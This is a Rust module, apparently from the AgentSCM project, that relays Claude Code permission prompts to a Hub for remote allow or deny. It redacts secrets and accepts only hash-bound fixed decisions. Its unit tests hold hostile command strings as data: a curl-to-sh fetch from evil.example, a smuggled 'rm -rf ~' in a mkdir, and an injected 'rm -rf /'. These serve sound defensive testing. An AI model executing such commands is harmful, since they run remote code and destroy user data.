//! Letting the person allow or deny a Claude Code permission prompt from the Hub.
//!
//! The `PermissionRequest` hook already told the Hub the session waits (see `coordinate`). Here
//! the hook goes on to register the prompt it is showing and to wait for a decision, all while
//! the dialog stays usable in the session. Everything the Hub is told about the tool is made on
//! this machine: its name, what to show of it (a command, a path, an address, with secrets
//! redacted) and a salted hash of the tool input.
//!
//! The Hub is never trusted to compose the answer. The hook prints one of two fixed decisions,
//! and only for a reply that names this hook's own request id and input hash; anything else, and
//! every failure, prints the ordinary reply, which carries no decision, so the dialog decides.
use std::path::Path;
use std::time::{Duration, Instant};

use agentscm::hook_relay::REPLY_BYTES;
use agentscm::hub::forge_http::{self, send};
use agentscm::redact::redact_json;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};

/// Local switch for a machine that does not want its Hub to approve anything. There is no opt-in.
const OFF_SWITCH: &str = "AGENTSCM_REMOTE_ANSWERS";
/// Test-only way to shorten (never lengthen) the hook's bound.
const BOUND_OVERRIDE: &str = "AGENTSCM_TEST_PERMISSION_BOUND_MS";
/// The host's hook timeout is 12 hours; the hook ends itself a minute earlier.
const HOOK_BOUND: Duration = Duration::from_secs(43_140);
/// The Hub confirms a shown prompt within seconds; a request still unconfirmed this long after
/// the hook started belongs to a run with nobody at a dialog.
const UNCONFIRMED_GIVE_UP: Duration = Duration::from_secs(20);
const POLL_SECONDS: u64 = 25;
const CALL_TIMEOUT: Duration = Duration::from_secs(30);
const RETRY_PAUSE: Duration = Duration::from_secs(5);
/// The longest pause between tries while the Hub cannot be reached.
const MAX_RETRY_PAUSE: Duration = Duration::from_secs(60);
const MAX_SESSION_BYTES: usize = 1024;
const MAX_AGENT_ID_BYTES: usize = 128;
const MAX_TOOL_BYTES: usize = 128;
/// Characters of the display sent; the Hub cuts at the same bound. Room for a long tool input
/// (a brief for a new session, a message to send), which the person reads in full before allowing.
const MAX_DISPLAY_CHARS: usize = 20_000;
const MAX_SUMMARY_CHARS: usize = 200;
/// Unshown parts a request names, and the characters sent of each name; the Hub's bounds.
const MAX_UNSHOWN: usize = 16;
const MAX_UNSHOWN_CHARS: usize = 64;
/// The unshown part of a request that has an input and nothing to show of it.
const WHOLE_INPUT: &str = "the request's input";
/// Input fields that name what a call is about, in the order tried.
const TITLE_FIELDS: [&str; 4] = ["title", "name", "subject", "description"];
/// What the model sees when the person denies from the Hub: fixed here, never taken from the Hub.
const DENY_MESSAGE: &str = "Denied from the AgentSCM Hub by its person.";
const HASH_DOMAIN: &[u8] = b"agentscm.permission.v1\0";

/// Whether this hook call should offer its prompt to the Hub.
pub(super) fn applies(agent: &str, client_connection: bool, payload: &Value) -> bool {
    applies_with(
        agent,
        client_connection,
        payload,
        std::env::var(OFF_SWITCH).ok().as_deref(),
    )
}

fn applies_with(
    agent: &str,
    client_connection: bool,
    payload: &Value,
    switch: Option<&str>,
) -> bool {
    agent == "claude"
        && client_connection
        && switch.is_none_or(|value| value.trim() != "0")
        && payload["hook_event_name"] == "PermissionRequest"
        // The host holds a subagent's dialog until this hook returns, so waiting here would only
        // delay the person at the keyboard; those prompts are answered in the session.
        && payload["agent_id"].as_str().is_none_or(str::is_empty)
        && tool_of(payload).is_some()
        && session_of(payload).is_some()
}

fn session_of(payload: &Value) -> Option<&str> {
    payload["session_id"].as_str().filter(|id| {
        (1..=MAX_SESSION_BYTES).contains(&id.len()) && !id.chars().any(char::is_control)
    })
}

/// The tool, except for a question: answering those from the Hub is not offered.
fn tool_of(payload: &Value) -> Option<&str> {
    payload["tool_name"].as_str().filter(|tool| {
        *tool != "AskUserQuestion"
            && (1..=MAX_TOOL_BYTES).contains(&tool.len())
            && tool
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b':' | b'-'))
    })
}

/// Named the way the Hub records the asker: a subagent's id, or none for the lead.
fn agent_id_of(payload: &Value) -> Option<&str> {
    payload["agent_id"].as_str().filter(|id| {
        (1..=MAX_AGENT_ID_BYTES).contains(&id.len()) && !id.chars().any(char::is_control)
    })
}

/// What the person is shown of the tool request, and what of it they are not shown. They may
/// allow it either way: the request is their own agent's, and the page says what is missing.
#[derive(Debug, Default, PartialEq, Eq)]
struct Display {
    text: String,
    /// Characters the text had before it was cut to the bound; none when it was not cut.
    cut_from: Option<usize>,
    /// Secrets replaced in the text.
    redacted: usize,
    /// Parts of the request the text leaves out, by name.
    unshown: Vec<String>,
    /// The change itself (an edit's content) is not part of the text.
    content_hidden: bool,
}

/// One text for the person: the command in full for a shell, the path for an edit (never its
/// content), the address for a fetch, and the input of any other tool, all with secrets redacted.
fn display_line(tool: &str, input: &Value, cwd: &str) -> Display {
    let field = |key: &str| input[key].as_str();
    let relative = |path: &str| -> String {
        match Path::new(path).strip_prefix(cwd) {
            Ok(inside) if !cwd.is_empty() && !inside.as_os_str().is_empty() => {
                inside.display().to_string()
            }
            _ => path.to_owned(),
        }
    };
    let with_path = |main: &str| match field("path") {
        Some(path) => format!("{main} in {}", relative(path)),
        None => main.to_owned(),
    };
    let text = |text: Option<String>| text.map(Value::String);
    // What is shown of each tool, and `covered`: the input's fields that this shows or that
    // change nothing a person decides on. Any other field present is named as unshown (for a
    // shell command, a sandbox override). With no `covered` no field is named: the whole input
    // is shown, or `content_hidden` already says the change is not.
    let (mut shown, covered, content_hidden) = match tool {
        "Bash" => (
            text(field("command").map(str::to_owned)),
            Some(&["command", "description", "timeout", "run_in_background"][..]),
            false,
        ),
        "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => (
            text(field("file_path").or(field("notebook_path")).map(relative)),
            None,
            true,
        ),
        "Read" => (
            text(field("file_path").map(relative)),
            Some(&["file_path", "offset", "limit", "pages"][..]),
            false,
        ),
        "Glob" | "Grep" => (
            text(field("pattern").map(with_path)),
            Some(&["pattern", "path"][..]),
            false,
        ),
        "WebFetch" => (
            text(field("url").map(|url| shaped_url(url).0)),
            Some(&["url"][..]),
            false,
        ),
        "WebSearch" => (
            text(field("query").map(str::to_owned)),
            Some(&["query"][..]),
            false,
        ),
        _ if input.is_null() => (None, None, false),
        // Any other tool, a subagent's start and an MCP server's tools included: its whole
        // input, as indented JSON below.
        _ => (Some(input.clone()), None, false),
    };
    let mut unshown: Vec<String> = match (covered, input.as_object()) {
        (Some(covered), Some(map)) => map
            .keys()
            .filter(|key| !covered.contains(&key.as_str()))
            .cloned()
            .collect(),
        _ => Vec::new(),
    };
    if tool == "WebFetch"
        && let Some(url) = field("url")
    {
        unshown.extend(shaped_url(url).1.into_iter().map(str::to_owned));
    }
    // The same redaction as everything else that leaves this machine. It can hide the very part
    // that matters (`TOKEN=$(…)`), so the person is told how many secrets were replaced.
    let mut redacted = shown.as_mut().map_or(0, redact_json);
    let shown = shown
        .and_then(|value| match value {
            Value::String(text) => Some(text),
            other => serde_json::to_string_pretty(&other).ok(),
        })
        .filter(|text| !text.trim().is_empty());
    // With nothing to show of a request that has an input, the person sees only the tool and
    // is told that the input is not shown.
    if shown.is_none() && input.as_object().is_some_and(|map| !map.is_empty()) {
        unshown = vec![WHOLE_INPUT.to_owned()];
    }
    let shown = shown.unwrap_or_else(|| tool.to_owned());
    let (unshown, in_names) = named(unshown);
    redacted += in_names;
    let chars = shown.chars().count();
    let cut = chars > MAX_DISPLAY_CHARS;
    Display {
        text: if cut {
            shown.chars().take(MAX_DISPLAY_CHARS).collect()
        } else {
            shown
        },
        cut_from: cut.then_some(chars),
        redacted,
        unshown,
        content_hidden,
    }
}

/// The names of what is not shown, as they leave the machine: at most [`MAX_UNSHOWN`], each a
/// short line with secrets redacted like the display's. Also returns how many were replaced.
fn named(mut names: Vec<String>) -> (Vec<String>, usize) {
    if names.len() > MAX_UNSHOWN {
        let more = names.len() - (MAX_UNSHOWN - 1);
        names.truncate(MAX_UNSHOWN - 1);
        names.push(format!("and {more} more"));
    }
    let mut names = Value::from(names);
    let redacted = redact_json(&mut names);
    let names = names
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .map(|name| name.chars().take(MAX_UNSHOWN_CHARS).collect())
        .collect();
    (names, redacted)
}

/// One plain line saying what the call does, for a person who is not looking at the session:
/// "run a shell command: Publish the crate", "use start session (ccd_session): Fix the login".
/// A label beside the display, never a replacement for it; secrets are redacted like the display's.
fn summary(tool: &str, input: &Value) -> String {
    let field = |key: &str| {
        input[key]
            .as_str()
            .map(str::trim)
            .filter(|text| !text.is_empty())
    };
    let file = |key: &str| {
        field(key).and_then(|path| Path::new(path).file_name()?.to_str().map(str::to_owned))
    };
    let (what, about) = match tool {
        "Bash" => (
            "run a shell command".to_owned(),
            field("description").map(str::to_owned),
        ),
        "Edit" | "MultiEdit" => ("edit a file".to_owned(), file("file_path")),
        "NotebookEdit" => ("edit a notebook".to_owned(), file("notebook_path")),
        "Write" => ("write a file".to_owned(), file("file_path")),
        "Read" => ("read a file".to_owned(), file("file_path")),
        "Glob" | "Grep" => (
            "search files".to_owned(),
            field("pattern").map(str::to_owned),
        ),
        "WebFetch" => (
            "fetch a web page".to_owned(),
            field("url").map(|url| shaped_url(url).0),
        ),
        "WebSearch" => (
            "search the web".to_owned(),
            field("query").map(str::to_owned),
        ),
        "Task" | "Agent" => (
            "start a subagent".to_owned(),
            field("description").map(str::to_owned),
        ),
        _ => {
            // An MCP tool is `mcp__<server>__<tool>`; its words read better without underscores.
            let what = match tool
                .strip_prefix("mcp__")
                .and_then(|rest| rest.split_once("__"))
            {
                Some((server, name)) => format!("use {} ({server})", name.replace('_', " ")),
                None => format!("use {tool}"),
            };
            let about = TITLE_FIELDS.iter().find_map(|key| field(key));
            (what, about.map(str::to_owned))
        }
    };
    let line = match about {
        Some(about) => format!("{what}: {about}"),
        None => what,
    };
    let mut line = Value::String(line.split_whitespace().collect::<Vec<_>>().join(" "));
    redact_json(&mut line);
    let line = line.as_str().unwrap_or_default();
    if line.chars().count() <= MAX_SUMMARY_CHARS {
        return line.to_owned();
    }
    let kept: String = line.chars().take(MAX_SUMMARY_CHARS - 1).collect();
    format!("{kept}…")
}

/// `scheme://host/path` without userinfo, query or fragment, and the names of the parts dropped.
fn shaped_url(url: &str) -> (String, Vec<&'static str>) {
    let Some((scheme, rest)) = url.split_once("://") else {
        return (url.to_owned(), Vec::new());
    };
    let cut = rest.find(['?', '#']).unwrap_or(rest.len());
    let (rest, tail) = rest.split_at(cut);
    let (authority, path) = rest.split_at(rest.find('/').unwrap_or(rest.len()));
    let (sign_in, host) = match authority.rfind('@') {
        Some(at) => (true, &authority[at + 1..]),
        None => (false, authority),
    };
    let dropped = [
        (sign_in, "the address's sign-in part"),
        (tail.starts_with('?'), "the address's query"),
        (tail.contains('#'), "the address's fragment"),
    ];
    (
        format!("{scheme}://{host}{path}"),
        dropped
            .into_iter()
            .filter_map(|(was, name)| was.then_some(name))
            .collect(),
    )
}

/// Binds a request to this process's prompt: the salt stays here, so the Hub can neither guess
/// the input from the hash nor answer for another prompt.
fn input_hash(
    salt: &[u8; 16],
    session: &str,
    agent_id: Option<&str>,
    tool: &str,
    input: &Value,
) -> String {
    let mut hasher = Sha256::new();
    hasher.update(HASH_DOMAIN);
    hasher.update(salt);
    for part in [
        session,
        "\0",
        agent_id.unwrap_or_default(),
        "\0",
        tool,
        "\0",
    ] {
        hasher.update(part.as_bytes());
    }
    hasher.update(serde_json::to_vec(input).unwrap_or_default());
    format!("{:x}", hasher.finalize())
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Answer {
    Allow,
    Deny,
}

/// The only two decisions this hook ever prints.
fn decision_output(answer: Answer) -> Value {
    let decision = match answer {
        Answer::Allow => json!({"behavior": "allow"}),
        Answer::Deny => json!({"behavior": "deny", "message": DENY_MESSAGE}),
    };
    json!({"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": decision}})
}

/// What a reply to register or poll means for the hook.
#[derive(Debug, PartialEq, Eq)]
enum Step {
    Wait {
        unconfirmed: bool,
    },
    Decide(Answer),
    /// A busy or unreachable Hub: try again shortly, for as long as the hook waits.
    Retry,
    Stop,
}

fn only_keys(reply: &Value, allowed: &[&str]) -> bool {
    reply
        .as_object()
        .is_some_and(|map| map.keys().all(|key| allowed.contains(&key.as_str())))
}

fn is_request_id(id: &str) -> bool {
    (1..=64).contains(&id.len()) && id.bytes().all(|b| b.is_ascii_hexdigit())
}

/// The request id of a registration whose reply echoes this hook's hash, and whether the Hub
/// still waits for the host to confirm the prompt.
fn registered(reply: Option<(u16, Value)>, hash: &str) -> Option<(String, bool)> {
    let (200, reply) = reply? else {
        return None;
    };
    if !only_keys(&reply, &["request_id", "input_hash", "state"]) || reply["input_hash"] != hash {
        return None;
    }
    let id = reply["request_id"]
        .as_str()
        .filter(|id| is_request_id(id))?;
    match reply["state"].as_str()? {
        "pending" => Some((id.to_owned(), false)),
        "unconfirmed" => Some((id.to_owned(), true)),
        _ => None,
    }
}

/// Accepts a decision only from a 200 reply for this hook's own request id and hash, with exactly
/// `allow` or `deny` and nothing else in it.
fn classify(reply: Option<(u16, Value)>, id: &str, hash: &str) -> Step {
    let Some((status, reply)) = reply else {
        return Step::Retry;
    };
    match status {
        200 => {}
        // 502 and 504 are a proxy in front of a Hub that is being replaced.
        429 | 502 | 503 | 504 => return Step::Retry,
        _ => return Step::Stop,
    }
    if !only_keys(&reply, &["request_id", "input_hash", "state", "decision"])
        || reply["request_id"] != id
        || reply["input_hash"] != hash
    {
        return Step::Stop;
    }
    let decision = &reply["decision"];
    match (reply["state"].as_str(), decision.as_str()) {
        (Some("pending"), None) if decision.is_null() => Step::Wait { unconfirmed: false },
        (Some("unconfirmed"), None) if decision.is_null() => Step::Wait { unconfirmed: true },
        (Some("answered"), Some("allow")) => Step::Decide(Answer::Allow),
        (Some("answered"), Some("deny")) => Step::Decide(Answer::Deny),
        _ => Step::Stop,
    }
}

struct Hub {
    client: reqwest::Client,
    base: String,
    repo: String,
    token: String,
}

impl Hub {
    /// `None` when the call failed in transit; the reply otherwise, whatever its status.
    async fn post(&self, route: &str, body: &Value) -> Option<(u16, Value)> {
        let mut url = reqwest::Url::parse(&format!("{}{route}", self.base)).ok()?;
        url.query_pairs_mut().append_pair("repo", &self.repo);
        let request = self
            .client
            .post(url)
            .header(reqwest::header::CONTENT_TYPE, "application/json")
            .bearer_auth(&self.token)
            .body(serde_json::to_vec(body).ok()?)
            .timeout(CALL_TIMEOUT);
        send(request, REPLY_BYTES).await.ok()
    }
}

fn bound() -> Duration {
    std::env::var(BOUND_OVERRIDE)
        .ok()
        .and_then(|ms| ms.parse::<u64>().ok())
        .map_or(HOOK_BOUND, |ms| HOOK_BOUND.min(Duration::from_millis(ms)))
}

fn parent() -> u32 {
    #[cfg(unix)]
    {
        std::os::unix::process::parent_id()
    }
    #[cfg(not(unix))]
    {
        0
    }
}

/// The harness that started this hook is gone (a closed terminal), so nobody waits for it.
fn parent_gone(started_under: u32) -> bool {
    cfg!(unix) && parent() != started_under
}

/// Registers the prompt with the Hub and waits for the person's decision. Returns the decision
/// to print, or `fallback` (the ordinary reply, with no decision) on any failure, timeout or
/// when the session moved on.
pub(super) async fn await_answer(payload: &Value, started: Instant, fallback: Value) -> Value {
    run(payload, started).await.unwrap_or(fallback)
}

async fn run(payload: &Value, started: Instant) -> Option<Value> {
    let started_under = parent();
    let routed = super::route_client("claude", payload).ok()?;
    let token = crate::client_cli::read_token(&routed.connection.token_file).ok()?;
    if token.is_empty() {
        return None;
    }
    let (session, tool) = (session_of(payload)?, tool_of(payload)?);
    let agent_id = agent_id_of(payload);
    let input = &payload["tool_input"];
    let mut salt = [0u8; 16];
    getrandom::fill(&mut salt).ok()?;
    let hash = input_hash(&salt, session, agent_id, tool, input);
    let shown = display_line(tool, input, payload["cwd"].as_str().unwrap_or_default());
    let mut body = json!({
        "session": session,
        "tool": tool,
        "summary": summary(tool, input),
        "display": shown.text,
        "missing": {
            "cut_from": shown.cut_from,
            "redacted": shown.redacted,
            "unshown": shown.unshown,
        },
        "content_hidden": shown.content_hidden,
        "input_hash": hash,
    });
    if let Some(agent_id) = agent_id {
        body["agent_id"] = json!(agent_id);
    }
    // Names the session to its person when it leads no Work: the folder they started it in.
    if let Some(folder) = routed.checkout.file_name().and_then(|name| name.to_str()) {
        body["folder"] = json!(folder);
    }
    let hub = Hub {
        client: forge_http::client().ok()?,
        base: routed.connection.hub.trim_end_matches('/').to_owned(),
        repo: routed.connection.repo.clone(),
        token,
    };
    let (id, mut unconfirmed) =
        registered(hub.post("/v1/hub/permission/register", &body).await, &hash)?;
    let until = started + bound();
    // Longer after each failure in a row, and never past the bound, so the hook ends on time.
    let pause = |tries: u32| {
        let wait = (RETRY_PAUSE * tries.max(1)).min(MAX_RETRY_PAUSE);
        tokio::time::sleep(wait.min(until.saturating_duration_since(Instant::now())))
    };
    let mut failures: u32 = 0;
    loop {
        let now = Instant::now();
        if now >= until || parent_gone(started_under) {
            return None;
        }
        let mut wait = POLL_SECONDS.min(until.saturating_duration_since(now).as_secs());
        if unconfirmed {
            let left = UNCONFIRMED_GIVE_UP.checked_sub(started.elapsed())?;
            if left.is_zero() {
                return None;
            }
            wait = wait.min(left.as_secs() + 1);
        }
        let poll = json!({"request_id": id, "input_hash": hash, "wait_seconds": wait});
        let asked = Instant::now();
        match classify(hub.post("/v1/hub/permission/poll", &poll).await, &id, &hash) {
            Step::Wait { unconfirmed: next } => {
                failures = 0;
                // A Hub with its poll slots full answers at once with nothing new; pause
                // rather than ask again immediately.
                let quick = asked.elapsed() < Duration::from_secs(1) && next == unconfirmed;
                unconfirmed = next;
                if quick {
                    pause(1).await;
                }
            }
            Step::Decide(answer) => return Some(decision_output(answer)),
            // The computer slept, the network dropped or the Hub is being replaced. The prompt
            // may still be on screen, so the hook keeps trying for its whole bound; the Hub
            // offers the request again once it hears this hook again.
            Step::Retry => {
                failures = failures.saturating_add(1);
                pause(failures).await;
            }
            Step::Stop => return None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn line(tool: &str, input: Value) -> Display {
        display_line(tool, &input, "/work/acme")
    }

    #[test]
    fn applies_only_to_claude_prompts_on_the_plugin_route_with_the_switch_not_off() {
        let prompt = json!({
            "hook_event_name": "PermissionRequest", "session_id": "s", "tool_name": "Bash",
        });
        assert!(applies_with("claude", true, &prompt, None));
        assert!(applies_with("claude", true, &prompt, Some("1")));
        assert!(!applies_with("claude", true, &prompt, Some("0")));
        assert!(!applies_with("claude", false, &prompt, None));
        assert!(!applies_with("codex", true, &prompt, None));
        let mut subagent = prompt.clone();
        subagent["agent_id"] = json!("sub-1");
        assert!(!applies_with("claude", true, &subagent, None));
        subagent["agent_id"] = json!("");
        assert!(applies_with("claude", true, &subagent, None));
        let mut question = prompt.clone();
        question["tool_name"] = json!("AskUserQuestion");
        assert!(!applies_with("claude", true, &question, None));
        let mut other = prompt.clone();
        other["hook_event_name"] = json!("Notification");
        assert!(!applies_with("claude", true, &other, None));
        let mut nameless = prompt.clone();
        nameless["session_id"] = json!("");
        assert!(!applies_with("claude", true, &nameless, None));
        let mut odd = prompt;
        odd["tool_name"] = json!("Ba sh");
        assert!(!applies_with("claude", true, &odd, None));
    }

    #[test]
    fn display_follows_the_rule_of_each_tool() {
        let bash = line("Bash", json!({"command": "git push\n  origin main"}));
        assert_eq!(
            bash,
            Display {
                text: "git push\n  origin main".into(),
                ..Display::default()
            }
        );
        // An edit shows its path (relative inside the working directory), never its content.
        let edit = line(
            "Edit",
            json!({"file_path": "/work/acme/src/a.rs", "old_string": "secret", "new_string": "x"}),
        );
        assert_eq!(
            edit,
            Display {
                text: "src/a.rs".into(),
                content_hidden: true,
                ..Display::default()
            }
        );
        let outside = line("Write", json!({"file_path": "/etc/hosts", "content": "x"}));
        assert_eq!(outside.text, "/etc/hosts");
        assert_eq!(
            line(
                "NotebookEdit",
                json!({"notebook_path": "/work/acme/n.ipynb"})
            )
            .text,
            "n.ipynb"
        );
        assert_eq!(
            line("Read", json!({"file_path": "/work/acme/README.md"})).text,
            "README.md"
        );
        assert_eq!(
            line("Grep", json!({"pattern": "TODO", "path": "/work/acme/src"})).text,
            "TODO in src"
        );
        assert_eq!(line("Glob", json!({"pattern": "**/*.rs"})).text, "**/*.rs");
        assert_eq!(
            line("WebSearch", json!({"query": "rust axum"})).text,
            "rust axum"
        );
        let fetch = line(
            "WebFetch",
            json!({"url": "https://user:pw@example.com/a/b?q=1#frag", "prompt": "summarise"}),
        );
        assert_eq!(fetch.text, "https://example.com/a/b");
        assert_eq!(
            fetch.unshown,
            [
                "prompt",
                "the address's sign-in part",
                "the address's query",
                "the address's fragment"
            ]
        );
        assert_eq!(
            line("WebFetch", json!({"url": "https://example.com/a#top"})).unshown,
            ["the address's fragment"]
        );
        let plain = line("WebFetch", json!({"url": "https://example.com/a"}));
        assert_eq!(
            plain,
            Display {
                text: "https://example.com/a".into(),
                ..Display::default()
            }
        );
        // Any other tool shows its whole input as indented JSON.
        let task = line("Task", json!({"description": "find it", "prompt": "long"}));
        assert_eq!(
            task,
            Display {
                text: "{\n  \"description\": \"find it\",\n  \"prompt\": \"long\"\n}".into(),
                ..Display::default()
            }
        );
        let started = line(
            "mcp__ccd_session__start_session",
            json!({"title": "Fix the login", "prompt": "Read src/login.rs.\nThen fix it.",
                "use_worktree": true}),
        );
        assert_eq!(
            started.text,
            "{\n  \"prompt\": \"Read src/login.rs.\\nThen fix it.\",\n  \"title\": \"Fix the login\",\n  \"use_worktree\": true\n}"
        );
        let mcp = line(
            "mcp__srv__do",
            json!({"id": 3, "api_key": "abc", "note": "token=zzz"}),
        );
        assert!(mcp.redacted >= 2, "each replaced secret is counted");
        assert!(mcp.text.contains(r#""id": 3"#));
        assert!(
            !mcp.text.contains("abc") && !mcp.text.contains("zzz"),
            "{}",
            mcp.text
        );
        // Nothing to show: only the tool, and that its input is not shown when it has one.
        assert_eq!(
            line("Bash", json!({})),
            Display {
                text: "Bash".into(),
                ..Display::default()
            }
        );
        assert_eq!(
            line("Bash", json!({"command": 123, "timeout": 5})),
            Display {
                text: "Bash".into(),
                unshown: vec![WHOLE_INPUT.into()],
                ..Display::default()
            }
        );
        assert_eq!(line("Custom", Value::Null).text, "Custom");
    }

    #[test]
    fn the_summary_says_in_one_line_what_the_call_does() {
        let cases = [
            (
                "Bash",
                json!({"command": "cargo publish", "description": "Publish the crate"}),
                "run a shell command: Publish the crate",
            ),
            ("Bash", json!({"command": "ls"}), "run a shell command"),
            (
                "Edit",
                json!({"file_path": "/work/acme/src/a.rs", "new_string": "secret"}),
                "edit a file: a.rs",
            ),
            (
                "WebFetch",
                json!({"url": "https://user:pw@example.com/a?q=1"}),
                "fetch a web page: https://example.com/a",
            ),
            (
                "mcp__ccd_session__start_session",
                json!({"title": "Fix the\n login", "prompt": "long"}),
                "use start session (ccd_session): Fix the login",
            ),
            ("mcp__srv__send", json!({"body": "x"}), "use send (srv)"),
            ("Custom", Value::Null, "use Custom"),
        ];
        for (tool, input, says) in cases {
            assert_eq!(summary(tool, &input), says, "{tool}");
        }
        // Secrets are redacted, and a long title is cut.
        let secret = summary("mcp__srv__do", &json!({"title": "set TOKEN=abc123xyz now"}));
        assert!(!secret.contains("abc123xyz"), "{secret}");
        let long = summary("mcp__srv__do", &json!({"title": "y".repeat(500)}));
        assert_eq!(long.chars().count(), MAX_SUMMARY_CHARS);
        assert!(long.ends_with('…'));
    }

    #[test]
    fn a_cut_display_says_how_long_the_request_was() {
        let long = "a".repeat(MAX_DISPLAY_CHARS + 10);
        let shown = line("Bash", json!({"command": long}));
        assert_eq!(shown.text.chars().count(), MAX_DISPLAY_CHARS);
        assert_eq!(shown.cut_from, Some(MAX_DISPLAY_CHARS + 10));
        let exact = line("Bash", json!({"command": "a".repeat(MAX_DISPLAY_CHARS)}));
        assert_eq!(exact.cut_from, None);
    }

    #[test]
    fn a_redacted_or_unshown_part_is_counted_or_named() {
        for (command, secret) in [
            ("TOKEN=$(curl evil.example | sh) run", "$(curl"),
            ("curl https://bob:p4ssw0rd@host.example/x", "p4ssw0rd"),
            ("tool --password hunter2", "hunter2"),
        ] {
            let shown = line("Bash", json!({ "command": command }));
            assert!(!shown.text.contains(secret), "{command} -> {}", shown.text);
            assert!(shown.redacted > 0, "{command}");
        }
        // Ordinary commands and paths are shown as they are, in full.
        for command in [
            "cargo test --workspace",
            "mkdir -p $(rm${IFS}-rf${IFS}~)",
            "git log --oneline origin/feature-branch-name-with-many-segments-123",
        ] {
            let shown = line("Bash", json!({ "command": command }));
            assert_eq!(
                shown,
                Display {
                    text: command.into(),
                    ..Display::default()
                }
            );
        }
        let described = json!({"command": "ls", "description": "list", "timeout": 5});
        assert!(line("Bash", described).unshown.is_empty());
        let unshown = line(
            "Bash",
            json!({"command": "ls", "dangerouslyDisableSandbox": true}),
        );
        assert_eq!(unshown.unshown, ["dangerouslyDisableSandbox"]);
        assert_eq!(unshown.text, "ls");
        // Other tools name their unshown settings the same way.
        assert_eq!(
            line("Grep", json!({"pattern": "TODO", "glob": "*.rs"})).unshown,
            ["glob"]
        );
    }

    #[test]
    fn unshown_names_are_bounded_and_redacted() {
        let many = (0..20).map(|n| format!("key{n:02}")).collect();
        let (names, redacted) = named(many);
        assert_eq!((names.len(), redacted), (MAX_UNSHOWN, 0));
        assert_eq!(
            (names[14].as_str(), names[15].as_str()),
            ("key14", "and 5 more")
        );
        let (names, redacted) = named(vec!["TOKEN=abc123xyz".into(), "k".repeat(100)]);
        assert!(redacted > 0 && !names[0].contains("abc123xyz"), "{names:?}");
        assert_eq!(names[1].chars().count(), MAX_UNSHOWN_CHARS);
    }

    #[test]
    fn the_hash_binds_salt_session_asker_tool_and_input() {
        let (a, b) = ([1u8; 16], [2u8; 16]);
        let input = json!({"command": "ls"});
        let base = input_hash(&a, "s", None, "Bash", &input);
        assert_eq!(base.len(), 64);
        assert!(
            base.bytes()
                .all(|c| c.is_ascii_digit() || (b'a'..=b'f').contains(&c))
        );
        assert_eq!(base, input_hash(&a, "s", None, "Bash", &input));
        for other in [
            input_hash(&b, "s", None, "Bash", &input),
            input_hash(&a, "t", None, "Bash", &input),
            input_hash(&a, "s", Some("sub"), "Bash", &input),
            input_hash(&a, "s", None, "Edit", &input),
            input_hash(&a, "s", None, "Bash", &json!({"command": "ls -l"})),
        ] {
            assert_ne!(base, other);
        }
    }

    #[test]
    fn only_the_two_fixed_decisions_are_ever_printed() {
        assert_eq!(
            decision_output(Answer::Allow),
            json!({"hookSpecificOutput": {"hookEventName": "PermissionRequest",
                "decision": {"behavior": "allow"}}})
        );
        assert_eq!(
            decision_output(Answer::Deny),
            json!({"hookSpecificOutput": {"hookEventName": "PermissionRequest",
                "decision": {"behavior": "deny",
                    "message": "Denied from the AgentSCM Hub by its person."}}})
        );
    }

    #[test]
    fn a_decision_is_accepted_only_for_this_requests_id_and_hash() {
        let (id, hash) = ("0a1b2c", "h".repeat(64));
        let reply = |status, state: &str, decision: Value| {
            Some((
                status,
                json!({"request_id": id, "input_hash": hash, "state": state, "decision": decision}),
            ))
        };
        assert_eq!(
            classify(reply(200, "answered", json!("allow")), id, &hash),
            Step::Decide(Answer::Allow)
        );
        assert_eq!(
            classify(reply(200, "answered", json!("deny")), id, &hash),
            Step::Decide(Answer::Deny)
        );
        assert_eq!(
            classify(reply(200, "pending", Value::Null), id, &hash),
            Step::Wait { unconfirmed: false }
        );
        assert_eq!(
            classify(reply(200, "unconfirmed", Value::Null), id, &hash),
            Step::Wait { unconfirmed: true }
        );
        for stop in [
            reply(200, "ended", Value::Null),
            reply(200, "answered", json!("maybe")),
            reply(200, "answered", json!("ALLOW")),
            reply(200, "answered", Value::Null),
            reply(200, "pending", json!("allow")),
            reply(200, "answered", json!(true)),
            reply(404, "answered", json!("allow")),
            reply(401, "answered", json!("allow")),
            reply(409, "answered", json!("allow")),
            reply(500, "answered", json!("allow")),
            Some((200, json!("allow"))),
            Some((200, Value::Null)),
            Some((200, json!({"state": "answered", "decision": "allow"}))),
            Some((
                200,
                json!({"request_id": "other", "input_hash": hash, "state": "answered", "decision": "allow"}),
            )),
            Some((
                200,
                json!({"request_id": id, "input_hash": "x", "state": "answered", "decision": "allow"}),
            )),
            Some((
                200,
                json!({"request_id": id, "input_hash": hash, "state": "answered",
                       "decision": "allow", "updatedInput": {"command": "rm -rf /"}}),
            )),
        ] {
            assert_eq!(classify(stop.clone(), id, &hash), Step::Stop, "{stop:?}");
        }
        // Transient trouble is retried.
        assert_eq!(classify(None, id, &hash), Step::Retry);
        assert_eq!(
            classify(reply(502, "pending", Value::Null), id, &hash),
            Step::Retry
        );
        assert_eq!(
            classify(reply(429, "pending", Value::Null), id, &hash),
            Step::Retry
        );
        assert_eq!(
            classify(reply(503, "pending", Value::Null), id, &hash),
            Step::Retry
        );
    }

    #[test]
    fn a_registration_is_accepted_only_when_it_echoes_the_hash() {
        let hash = "a".repeat(64);
        let ok = |state: &str| {
            Some((
                200,
                json!({"request_id": "00ff", "input_hash": hash, "state": state}),
            ))
        };
        assert_eq!(
            registered(ok("pending"), &hash),
            Some(("00ff".into(), false))
        );
        assert_eq!(
            registered(ok("unconfirmed"), &hash),
            Some(("00ff".into(), true))
        );
        assert_eq!(registered(ok("answered"), &hash), None);
        assert_eq!(registered(None, &hash), None);
        assert_eq!(registered(ok("pending"), &"b".repeat(64)), None);
        assert_eq!(
            registered(Some((404, json!({"state": "pending"}))), &hash),
            None
        );
        let id_bad = Some((
            200,
            json!({"request_id": "not hex!", "input_hash": hash, "state": "pending"}),
        ));
        assert_eq!(registered(id_bad, &hash), None);
        let extra = Some((
            200,
            json!({"request_id": "00ff", "input_hash": hash, "state": "pending", "x": 1}),
        ));
        assert_eq!(registered(extra, &hash), None);
    }
}
